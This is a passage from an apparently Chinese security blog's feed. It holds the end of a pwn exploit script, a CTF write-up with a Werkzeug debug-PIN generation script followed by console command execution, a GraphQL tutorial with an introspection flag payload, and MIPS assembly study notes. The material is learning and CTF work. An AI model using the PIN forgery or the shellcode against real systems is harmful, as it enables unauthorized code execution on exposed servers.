eax</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\x33\x7e&#x27;</span></span><br><span class="line">add(-<span class="number">19</span>,shellcode)</span><br><span class="line">delete(-<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask的debug模式下的pin码利用</title>
    <url>/2025/01/10/Flask%E7%9A%84debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84pin%E7%A0%81%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h1 id="Flask的debug模式下的pin码利用"><a href="#Flask的debug模式下的pin码利用" class="headerlink" title="Flask的debug模式下的pin码利用"></a>Flask的debug模式下的pin码利用</h1><p>题目链接：<a href="https://buuoj.cn/challenges#[GYCTF2020]FlaskApp">FlaskApp</a></p>
<p><code>flask</code>在开启<code>debug</code>模式下，可以通过输入<code>pin</code>码进行代码调试模式，也就是<code>console</code>控制台。进入控制台之后再进行命令执行。</p>
<ul>
<li><code>username</code>：用户名</li>
<li><code> modname</code>：默认值为<code>flask.app</code></li>
<li><code>appname</code>：默认值为<code>Flask</code></li>
<li><code>moddir</code>：<code>flask</code>库下<code>app.py</code>的绝对路径</li>
<li><code> uuidnode</code>：当前网络的<code>mac</code>地址的十进制数。读取<code>/sys/class/net/eth0/address</code>得到十六进制数，转十进制即可。</li>
<li><code>machine_id</code>：机器<code>id</code>。<code>Linux</code>环境下一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_id</code>文件，<code>docker</code>靶机则是<code>/proc/self/cgroup</code>。</li>
</ul>
<p>生成<code>pin</code>值的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;28992066395378&#x27;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>然后使用<code>os</code>库的<code>popen</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>GraphQL API学习总结</title>
    <url>/2025/02/06/GraphQL%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="GraphQL语言学习"><a href="#GraphQL语言学习" class="headerlink" title="GraphQL语言学习"></a>GraphQL语言学习</h2><p>下面所有GraphQL文档都可以在<a href="https://hasura.io/learn/graphql/graphiql">在线graphiql网站</a>上面运行测试。</p>
<h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><p>GraphQL的三种操作：查询(query)、变更(mutation)、订阅(subscription)</p>
<p>这是一个带有查询操作的GraphQL文档示例：</p>
<figure class="highlight fsharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">query</span>&#123;</span><br><span class="line">  <span class="keyword">users</span>&#123;</span><br><span class="line">    <span class="built_in">id</span></span><br><span class="line">    name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h4><p>一个GraphQL字段描述一条独立信息。该信息可简单可复杂，含有数据之间的关系。在上述文档，操作中包含的全部内容，即<strong>users、id和name都是字段</strong>。</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>将字段想象成可以返回值的函数，他们也可以接收行为不同的参数，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">users</span>(<span class="built_in">limit</span>:5,order_by: &#123;<span class="built_in">id</span>:asc&#125;)</span><br></pre></td></tr></table></figure>

<p>该示例中，users字段接收参数limit，以限制返回的结果的数量，<code>order_by</code>参数用来将返回的结果进行排序，<code>&#123;id:asc&#125;</code>表示以id字段进行升序排序。</p>
<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">query (<span class="variable">$limit</span>: Int) &#123;</span><br><span class="line">  <span class="built_in">users</span>(<span class="built_in">limit</span>: <span class="variable">$limit</span>) &#123;</span><br><span class="line">    <span class="built_in">id</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该变量在操作的顶部定义，且该变量的值可由客户端以服务器理解的格式发送。 通常变量以JSON表示，如下所示：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    limit<span class="punctuation">:</span><span class="number">5</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="操作名称"><a href="#操作名称" class="headerlink" title="操作名称"></a>操作名称</h4><p>当文档中含有多个操作时，服务器必须了解执行哪些操作并以相同的顺序将结果映射回来。 例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">query fetchUser &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">query fetchUsers &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="片段"><a href="#片段" class="headerlink" title="片段"></a>片段</h4><p>片段可以提高GraphQL的重用性。 如果文档中的某些部分在给定的类型上重用相同的字段集，那么片段就大有帮助。如：</p>
<figure class="highlight fsharp"><table><tr><td class="code"><pre><span class="line">fragment userFields on <span class="keyword">users</span>&#123;</span><br><span class="line">  <span class="built_in">id</span></span><br><span class="line">  name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">query</span>&#123;</span><br><span class="line">  <span class="keyword">users</span>&#123;</span><br><span class="line">    <span class="operator">...</span>userFields</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处对片段的使用<code>...userFields</code>，这种用法叫作片段扩展。 还有内联片段，即没有分别明确声明片段却在查询中内联使用了它。</p>
<h4 id="指示"><a href="#指示" class="headerlink" title="指示"></a>指示</h4><p>GraphQL规范支持的一些默认服务器指示包括：</p>
<ul>
<li>@deprecated(reason: String) - 将字段标为已弃用</li>
<li>@skip(if: Boolean) - 跳过该字段的 GraphQL 执行</li>
<li>@include(if: Boolean) - 如果为 true，则为带注解的字段调用解析器。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">query (<span class="variable">$showName</span>: Boolean!)&#123;</span><br><span class="line">  <span class="built_in">users</span>&#123;</span><br><span class="line">    <span class="built_in">id</span></span><br><span class="line">    name @include(<span class="keyword">if</span>: <span class="variable">$showName</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="内省查询"><a href="#内省查询" class="headerlink" title="内省查询"></a>内省查询</h3><p>简单来说就是，GraphQL内置了接口文档，你可以通过内省的方法获得这些信息，如对象定义、接口参数等信息。<br>GraphQL服务器公开以下有关Query操作类型的内省查询：</p>
<ul>
<li>__schema</li>
<li>__type</li>
<li>__typename</li>
</ul>
<p>当使用者不知道某个GraphQL接口中的类型哪些是可用的，可以通过__schema字段来向GraphQL查询哪些类型是可用的。如：</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  __schema&#123;</span><br><span class="line">    types&#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102048775.png" alt="image-20250207182426398" style="zoom: 67%;" />

<h2 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h2><h3 id="NewStarCTF-公开赛赛道-ezAPI"><a href="#NewStarCTF-公开赛赛道-ezAPI" class="headerlink" title="[NewStarCTF 公开赛赛道]ezAPI"></a>[NewStarCTF 公开赛赛道]ezAPI</h3><p>payload:</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">i<span class="attr">d</span><span class="operator">=</span><span class="number">1</span>&amp;data<span class="operator">=</span>&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;&#123;<span class="char escape_">\n</span>  __schema&#123;<span class="char escape_">\n</span>    types&#123;<span class="char escape_">\n</span>      name<span class="char escape_">\n</span>    &#125;<span class="char escape_">\n</span>  &#125;<span class="char escape_">\n</span>&#125;<span class="char escape_">\n</span><span class="char escape_">\n</span>&quot;</span>,<span class="string">&quot;variables&quot;</span>:<span class="literal">null</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;query&#123;<span class="char escape_">\n</span>ffffllllaaagggg_1n_h3r3_flag(id:1) &#123;<span class="char escape_">\n</span>flag<span class="char escape_">\n</span>&#125;<span class="char escape_">\n</span>&#125;<span class="char escape_">\n</span>&quot;</span>, <span class="string">&quot;variables&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://hasura.io/learn/zh/graphql/intro-graphql/graphql-queries/">通过 GraphQL 查询抓取数据 | GraphQL 教程</a></p>
<p><a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">玩转graphQL</a></p>
<p><a href="https://carsaid.github.io/burpsuite-learn/wsa/notes/advanced/graphql/#graphql%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86">GraphQL API漏洞笔记 | 某不知名博客</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT入门之MIPS架构基础知识学习</title>
    <url>/2025/03/03/IOT%E5%85%A5%E9%97%A8%E4%B9%8BMIPS%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>花了几天的时间来学习MIPS，先从调试一段简单的代码开始，看看MIPS汇编指令是怎么进行一系列操作的，然后去了解各个指令的含义和寄存器的用途，遇到不易理解的就在gdb中调试一下，接着就是其函数调用约定及相关特性，最后是编写MIPS汇编的shellcode。学完这些紧接着就去复现漏洞了，也没好好总结一下，复现完漏洞后还是觉得要梳理一下MIPS的相关知识，想了想写篇文章总结是再好不过了，因此又花了不少时间写了下面这些内容。</p>
<span id="more"></span>

<p>学习过程中参考了不少师傅写的文章，大佬们写的都非常好非常感谢，链接放在最后了。本人菜鸟一枚，如有不对请指出，谢谢包容^_^</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>最开始的开始当然是先搭建好环境，搭建交叉编译环境和qemu，调试还要安装gdb-multiarch，这一部分就不细说了，内容不多就下面几条命令。（其实在这一步我已经踩了无数坑😀👍</p>
<h3 id="安装qemu、mips依赖库、gdb-multiarch"><a href="#安装qemu、mips依赖库、gdb-multiarch" class="headerlink" title="安装qemu、mips依赖库、gdb-multiarch"></a>安装qemu、mips依赖库、gdb-multiarch</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu</span><br><span class="line"><span class="built_in">sudo</span> apt install qemu-user-static binfmt-support qemu-user qemu-system</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-mips-linux-gnu</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-mipsel-linux-gnu</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-mips64-linux-gnuabi64</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-mips64el-linux-gnuabi64</span><br><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="安装buildroot交叉编译环境"><a href="#安装buildroot交叉编译环境" class="headerlink" title="安装buildroot交叉编译环境"></a>安装buildroot交叉编译环境</h3><p>去<a href="https://buildroot.org/">buildroot.org</a>下载buildroot-2024.02.11.tar.gz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf buildroot-2019.02.4.tar.gz</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>在<code>target options-&gt;target arch</code>选项里面选择自己要编译的架构，这里选择<code>MIPS(Little endian)</code>，代表MIPS小端序。<code>toolchain</code>中还要选择C语言库，这里选<code>uGlibc</code>。</p>
<p>设置环境变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/home/wen/Desktop/buildroot-2024.02.11/output/host/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>

<h2 id="程序启动调试"><a href="#程序启动调试" class="headerlink" title="程序启动调试"></a>程序启动调试</h2><p>demo.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> age = <span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My age is %d.\n&quot;</span>,age);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上面demo.c程序为例，执行下面指令来启动程序：<br>注：mips和mipsel的区别是前者为大端序，后者为小端序，<code>readelf -h demo</code>可以查看程序的字节序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">mips-linux-gnu-gcc demo.c -o demo -static -g <span class="comment">#-static是静态链接</span></span><br><span class="line"><span class="comment">#运行</span></span><br><span class="line">qemu-mips ./demo   <span class="comment">#（大端序</span></span><br></pre></td></tr></table></figure>

<p>如果要直接调试程序，先执行<code>qemu-mips -g 6666 ./demo</code>，然后在另一个终端，执行下面这几条命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"><span class="built_in">set</span> architecture mips   <span class="comment">#设置架构为mips</span></span><br><span class="line"><span class="built_in">set</span> endian big   <span class="comment">#设置端序为大端序</span></span><br><span class="line">symbol-file ./demo   <span class="comment">#添加符号表</span></span><br><span class="line">target remote localhost:6666</span><br></pre></td></tr></table></figure>

<p>如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503121514052.png" alt="image-20250310092641519" style="zoom:67%;" />

<p>上面这种情况是调试静态链接的程序，如果程序是动态链接的，先执行<code>qemu-mips -g 6666 ./demo</code>，然后执行这几条命令即可。</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">gdb-mutiarch</span><br><span class="line"><span class="keyword">file</span> ./demo</span><br><span class="line"><span class="keyword">target</span> remote localhost:<span class="number">6666</span></span><br></pre></td></tr></table></figure>

<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>MIPS架构中有32个通用寄存器，在汇编程序中可以用编号表示，也可以用寄存器的名称来表示，各个通用寄存器的详细信息如下表所示：</p>
<table>
<thead>
<tr>
<th align="left">编号</th>
<th>名称</th>
<th>描述</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td>$zero</td>
<td>常量寄存器，值为0</td>
<td></td>
</tr>
<tr>
<td align="left">$1</td>
<td>$at</td>
<td>为汇编器保留的寄存器，主要用于处理伪指令和加载大常数。</td>
<td>Assembler Temporary</td>
</tr>
<tr>
<td align="left">$2~$3</td>
<td>$v0~$v1</td>
<td>存储表达式或函数返回值</td>
<td>Values</td>
</tr>
<tr>
<td align="left">$4~$7</td>
<td>$a0~$a3</td>
<td>函数调用时，用来存储前四个参数</td>
<td>Arguments</td>
</tr>
<tr>
<td align="left">$8~$15</td>
<td>$t0~$t7</td>
<td>临时寄存器，存放临时变量</td>
<td>Temporaries</td>
</tr>
<tr>
<td align="left">$16~$23</td>
<td>$s0~$s7</td>
<td>保存寄存器，用于保存函数调用之间的状态（即寄存器的值）（与$t0~$t9相反）</td>
<td>Saved Values</td>
</tr>
<tr>
<td align="left">$24~$25</td>
<td>$t8~$t9</td>
<td>临时寄存器</td>
<td>Temporaries</td>
</tr>
<tr>
<td align="left">$26~$27</td>
<td>$k0~$k1</td>
<td>用于保存异常处理和中断的返回值，为操作系统<code>Keep</code>使用</td>
<td>Kernel reserved</td>
</tr>
<tr>
<td align="left">$28</td>
<td>$gp</td>
<td>全局指针</td>
<td>Global Pointer</td>
</tr>
<tr>
<td align="left">$29</td>
<td>$sp</td>
<td>堆栈指针，会指向栈顶</td>
<td>Stack Pointer</td>
</tr>
<tr>
<td align="left">$30</td>
<td>$s8&#x2F;$fp</td>
<td>可以作为第九个保存寄存器($s8)，也可以作为栈帧指针($fp)保存栈指针</td>
<td>Saved value &#x2F; Frame Pointer</td>
</tr>
<tr>
<td align="left">$31</td>
<td>$ra</td>
<td>存储函数的返回地址</td>
<td>Return Address</td>
</tr>
</tbody></table>
<h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><p>除了上面32个通用寄存器，MIPS架构还定义了一些特殊用途的寄存器，下面介绍一些特殊寄存器：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>$pc</td>
<td>程序计数器，指向当前执行的指令地址</td>
</tr>
<tr>
<td>$hi</td>
<td>高位寄存器，存储乘除操作的高位结果</td>
</tr>
<tr>
<td>$lo</td>
<td>低位寄存器，存储乘除操作的低位结果</td>
</tr>
<tr>
<td>$status</td>
<td>状态寄存器，控制处理器模式和中断状态</td>
</tr>
<tr>
<td>$cause</td>
<td>原因寄存器，存储异常和中断的原因</td>
</tr>
</tbody></table>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>MIPS架构固定4字节指令长度，其汇编指令与x86还是不太一样的，但区别也不大，下面就只介绍一些常见的汇编指令。</p>
<h3 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h3><table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">备注</th>
<th>描述</th>
<th align="left">举例分析</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>li</code></td>
<td align="left">Load Immediate</td>
<td>将立即数存入寄存器</td>
<td align="left"><code>li $a2,2</code>，$a2的值为2</td>
</tr>
<tr>
<td align="left"><code>lui</code></td>
<td align="left"></td>
<td>将立即数(以二进制形式)左移16位后，存入寄存器</td>
<td align="left"><code>lui $t0,0xF</code>，$t0的值为0xF0000</td>
</tr>
<tr>
<td align="left"><code>la</code></td>
<td align="left">Load Address</td>
<td>将地址存入寄存器</td>
<td align="left"><code>la $t9,memset</code>，$t9中为memset函数的地址</td>
</tr>
<tr>
<td align="left"><code>lw</code></td>
<td align="left">Load Word</td>
<td>从内存中加载一个<code>word</code>类型的值到寄存器中</td>
<td align="left"><code>lw $gp,0x170+var_158($sp)</code>，从栈指针$sp偏移 0x170+var_158 的位置，加载一个<code>32</code>位的值到$gp中</td>
</tr>
<tr>
<td align="left"><code>sw</code></td>
<td align="left">Store Word</td>
<td>将一个 32 位的值从寄存器存储到内存中</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>addi</code></td>
<td align="left">Add Immediate</td>
<td>将立即数与寄存器的值相加后，把结果写入另一个寄存器</td>
<td align="left"><code>addi $t,$s,0xF</code>，$t中为$s的值与0xF的和</td>
</tr>
<tr>
<td align="left"><code>addu</code></td>
<td align="left">Add Unsigned</td>
<td>将寄存器的值相加(无符号加法)后，把结果写到寄存器中</td>
<td align="left"><code>addu $v0,$v1,$v0</code></td>
</tr>
<tr>
<td align="left"><code>add</code></td>
<td align="left"></td>
<td>同addu，区别是该指令是有符号加法</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>addiu</code></td>
<td align="left"></td>
<td>同addi，区别是该指令加无符号立即数</td>
<td align="left"></td>
</tr>
</tbody></table>
<h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><table>
<thead>
<tr>
<th>指令</th>
<th>备注</th>
<th>描述</th>
<th>举例分析</th>
</tr>
</thead>
<tbody><tr>
<td><code>jr</code></td>
<td>Jump Register</td>
<td>无条件跳转到某个寄存器指定的地址</td>
<td></td>
</tr>
<tr>
<td><code>jal</code></td>
<td>Jump and Link</td>
<td>跳转到某个地址，并将返回地址存入<code>$ra</code>寄存器</td>
<td></td>
</tr>
<tr>
<td><code>jalr</code></td>
<td>Jump and Link Register</td>
<td>跳转到某个寄存器指定的地址，并将返回地址存入另一个寄存器</td>
<td><code>jalr $t9</code>跳转到$t9存储的地址，并将返回地址存入$ra</td>
</tr>
<tr>
<td><code>b</code></td>
<td>Branch</td>
<td>无条件跳转指令（标签或地址）</td>
<td></td>
</tr>
<tr>
<td><code>bnez</code></td>
<td>Branch if Not Equal to Zero</td>
<td>指定寄存器的值<strong>不为0</strong>，才跳转</td>
<td><code>bnez $v0,loc_402B24</code>若$v0的值为零则跳转到loc_402B24标签处</td>
</tr>
<tr>
<td><code>beqz</code></td>
<td>Branch if Equal to Zero</td>
<td>指定寄存器的值<strong>为0</strong>，才跳转</td>
<td></td>
</tr>
</tbody></table>
<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><h3 id="叶子与非叶子函数"><a href="#叶子与非叶子函数" class="headerlink" title="叶子与非叶子函数"></a>叶子与非叶子函数</h3><p>定义：现有3个函数分别为A、B、C，其中函数A调用函数B，函数B调用函数C，因此A和B为非叶子函数，C为叶子函数。</p>
<p>调用函数C时会将其返回地址直接存入<code>$ra</code>寄存器，执行完函数C后，程序流会直接执行<code>jr $ra</code>指令跳到返回地址（返回函数B）；而对于函数B，在跳转到B时会将其返回地址先存入<code>$ra</code>寄存器，然后在执行函数B的过程中再将<code>$ra</code>的值存入栈中，执行完后，程序流则会先从堆栈中取出被保存在堆栈上的返回地址，放入<code>$ra</code>寄存器中，然后再执行<code>jr $ra</code>指令。</p>
<h3 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h3><p>当参数小于等于4个时，使用<code>$a0 ~ $a3</code>寄存器存储；超过4个的部分被放到了栈里。且前4个参数在使用前也会被放入之前在栈中预留的空间中。</p>
<h3 id="栈帧开辟"><a href="#栈帧开辟" class="headerlink" title="栈帧开辟"></a>栈帧开辟</h3><p>调用函数时，MIPS架构下开辟栈帧的方式与x86架构不同，但最后的栈帧结构是相同的。MIPS下的栈帧开辟方式如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">► 0x400614 &lt;main+16&gt;    jal    A &lt;0x4005a4&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x4005a4 &lt;A&gt;          addiu  $sp, $sp, -0x20   #（1）开辟栈帧空间</span><br><span class="line">  0x4005a8 &lt;A+4&gt;        sw     $ra, 0x1c($sp)    #（2）存储返回地址（调用完函数A后返回到的地址</span><br><span class="line">  0x4005ac &lt;A+8&gt;        sw     $fp, 0x18($sp)    #（3）将$fp放入栈中</span><br><span class="line">  0x4005b0 &lt;A+12&gt;       move   $fp, $sp          #（4）将$sp放入$fp中</span><br></pre></td></tr></table></figure>

<p>等价的x86指令如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call 	main			#这里的作用同上面的（2）：先将返回地址push到栈上，然后跳到目标函数的第一条指令地址</span><br><span class="line">push    ebp				#（3）</span><br><span class="line">mov     ebp, esp		#（4）</span><br><span class="line">sub     esp, 14h		#（1）</span><br></pre></td></tr></table></figure>

<h2 id="mips架构特性"><a href="#mips架构特性" class="headerlink" title="mips架构特性"></a>mips架构特性</h2><p>MIPS架构存在“流水线效应”和“缓存不一致性”这两个特性。</p>
<p>“流水线效应”指的是本应该顺序执行的几条指令会同时执行，这样在执行跳转指令的时候，当刚要跳转到指定地址时，跳转指令的下一条指令也已经执行了，这样的现象称为<strong>分支延迟效应</strong>，跳转指令的下一条指令称为<strong>分支延迟槽</strong>。也因此，MIPS架构下的分支延迟槽通常都是<code>nop</code>指令，当然也不全是。</p>
<p>“缓存不一致性”指的是指令缓存区和数据缓存区两者的同步需要一个时间来同步，比如我们将shellcode写入栈上后，我们需要这块区域已经是指令缓存区，但此时其还属于数据缓存区，若直接跳转过去执行shellcode，就会出现问题，因此，我们<strong>需要调用<code>sleep</code>函数</strong>，先停顿一段时间，给它时间从数据缓存区转成指令缓存区，然后再跳转过去，才能成功执行。</p>
<h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><p><code>$v0</code>寄存器存储<strong>系统调用号</strong>和<strong>系统调用的返回值</strong>，<code>$a0 ~ $a3</code>寄存器用来存储前4个参数，<code>syscall</code>指令触发系统调用。</p>
<p>先试着自己写一个write的系统调用，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">some_label: .word 0x61626364</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    li $a0,1</span><br><span class="line">    la $a1,some_label</span><br><span class="line">    li $a2,4</span><br><span class="line">    li $v0,4004</span><br><span class="line">    syscall</span><br><span class="line">    li $v0,4001</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>注意系统调用完write后，还要再执行一个exit系统调用，以防止程序的执行流继续执行后面的指令，而导致出现一系列错误。</p>
